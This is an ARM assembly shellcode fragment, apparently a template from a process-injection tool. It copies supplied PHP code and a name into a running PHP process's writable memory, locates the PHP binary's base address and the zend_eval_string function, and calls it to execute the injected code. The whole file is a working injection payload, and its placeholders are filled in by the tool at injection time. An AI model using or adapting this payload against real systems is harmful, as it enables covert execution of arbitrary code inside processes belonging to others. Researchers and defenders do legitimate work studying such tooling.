[FRAGMENT:asminject_copy_bytes.s:FRAGMENT]

// load a pointer to the PHP code
	mov r0, pc
	b load_destination_address

php_code:
	.ascii "[VARIABLE:phpcode:VARIABLE]\0"
	.balign 4

load_destination_address:
	// r0 (source) is already set to code address
	ldr r7, [pc] 	@ Set r7 to the base read/write memory address
	b copy_code_to_rw_memory

read_write_address:
	.word [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	.balign 4

copy_code_to_rw_memory:
	// Set r1 (destination) to the base read/write memory address
	mov r1, r7
	// Add 0x80 to save some space to work with before the variable-length strings
	add r1, r1, #0x80
	// store the location of the script code in r6 for later
	mov r6, r1
	mov r2, #[VARIABLE:phpcode.length:VARIABLE]
	add r2, r2, #0x1	@ null terminator
	push {r6}
	push {r7}
	bl asminject_copy_bytes
	pop {r7}
	pop {r6}
	
// copy the "PHP name" value to r/w memory as well
	mov r0, pc
	b load_phpname

php_name:
	.ascii "[VARIABLE:phpname:VARIABLE]\0"
	.balign 4

load_phpname:
	// Set r1 (destination) to the base read/write memory address
	mov r1, r7
	// Add 0x80 get to the beginning of the code string
	add r1, r1, #0x80
	// Add the length of the code string
	add r1, r1, #[VARIABLE:phpcode.length:VARIABLE]
	// add space for null terminator, etc.
	add r1, r1, #0x10
	// store the location of the name in r5 for later
	mov r5, r1
	mov r2, #[VARIABLE:phpname.length:VARIABLE]
	add r2, r2, #0x1	@ null terminator
	push {r5}
	push {r6}
	push {r7}
	bl asminject_copy_bytes
	pop {r7}
	pop {r6}
	pop {r5}

// get the base address of the PHP binary
// (will be persisted in r9 throughout the remainder of this payload)
	ldr r9, [pc]
	b load_zend_eval_string_offset

base_address:
	.word [BASEADDRESS:.+/php[0-9\.]+$:BASEADDRESS]
	.balign 4

// BEGIN: call zend_eval_string
// get the offset of the zend_eval_string function
load_zend_eval_string_offset:
	ldr r8, [pc]
	b call_zend_eval_string

zend_eval_string_offset:
	.word [RELATIVEOFFSET:zend_eval_string:RELATIVEOFFSET]
	.balign 4

call_zend_eval_string:
	mov r0, r6
	mov r1, #0x0
	mov r2, r5
	add r4, r9, r8
	push {r5}
	push {r6}
	push {r7}
	push {r8}
	push {r9}
	blx r4
	pop {r9}
	pop {r8}
	pop {r7}
	pop {r6}
	pop {r5}
// END: call zend_eval_string

SHELLCODE_SECTION_DELIMITER
